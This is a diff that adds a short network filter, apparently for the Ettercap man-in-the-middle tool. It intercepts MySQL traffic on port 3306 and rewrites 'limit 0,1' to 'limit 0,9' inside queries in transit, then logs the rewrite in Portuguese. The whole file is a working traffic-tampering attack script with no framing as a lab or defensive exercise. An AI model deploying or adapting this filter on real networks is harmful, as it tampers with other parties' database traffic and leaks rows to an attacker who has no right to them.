@@ -1,0 +1,6 @@
+if (ip.proto == TCP && tcp.dst == 3306) {
+   if (search(DATA.data, "limit 0,1")) {
+      replace("limit 0,1", "limit 0,9");
+      msg("[+] Query MySQL reescrita: limit 0,1 -> limit 0,9\n");
+   }
+}
